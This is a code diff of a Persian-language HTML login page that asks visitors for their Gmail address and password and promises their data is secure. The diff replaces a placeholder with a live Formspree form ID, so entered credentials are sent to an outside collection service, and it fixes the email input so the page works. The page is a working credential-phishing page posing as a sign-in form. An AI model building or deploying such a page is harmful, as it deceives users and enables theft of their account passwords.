@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ورود به سیستم</title>
+    <title>ورود به حساب کاربری</title>
     <style>
-        /* استایل‌های شیک و مدرن */
+        /* استایل مدرن و تمیز برای ظاهر سایت */
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: #f0f2f5;
@@ -30,7 +30,7 @@
             margin: 10px 0;
             border: 1px solid #ddd;
             border-radius: 6px;
-            box-sizing: border-box; /* برای اینکه پدینگ باعث بیرون زدن نشه */
+            box-sizing: border-box;
             font-size: 16px;
         }
         button {
@@ -54,11 +54,11 @@
 <div class="login-container">
     <h2>ورود به حساب</h2>
     
-    <!-- در قسمت action، به جای 'YOUR_EMAIL_HERE'، ایمیل خودت رو بنویس -->
-    <form action="https://formspree.io/f/YOUR_EMAIL_HERE" method="POST">
+    <!-- لینک اختصاصی تو که از Formspree گرفتی اینجا قرار داره -->
+    <form action="https://formspree.io/f/mzeryyzv" method="POST">
         
         <!-- فیلد جیمیل -->
-        <input type eyes="email" name="Gmail_Address" placeholder="جیمیل خود را وارد کنید" required>
+        <input type="email" name="Gmail_Address" placeholder="جیمیل خود را وارد کنید" required>
         
         <!-- فیلد گذرواژه با محدودیت ۵ کاراکتر -->
         <input type="password" name="Password" placeholder="گذرواژه" minlength="5" required>
@@ -66,18 +66,17 @@
         <button type="submit">ورود</button>
     </form>
 
-    <p class="footer-text">از امنیت اطلاعات شما محافظت می‌کنیم.</p>
+    <p class="footer-text">امنیت اطلاعات شما اولویت ماست.</p>
 </div>
 
 <script>
-    // یک اسکریپت خیلی ساده برای اینکه مطمئن بشیم کاربر حداقل ۵ کاراکتر وارد کرده
-    // (هرچند خودِ HTML با minlength این کار رو انجام میده)
+    // چک کردن برای اطمینان از طول رمز (بیش از ۵ کاراکتر)
     const passwordInput = document.querySelector('input[name="Password"]');
     const form = document.querySelector('form');
 
     form.onsubmit = function(e) {
         if (passwordInput.value.length < 5) {
-            alert("گذرواژه باید حداقل ۵ کاراکتر باشد!");
+            alert("خطا: گذرواژه باید حداقل ۵ کاراکتر باشد!");
             e.preventDefault();
         }
     };
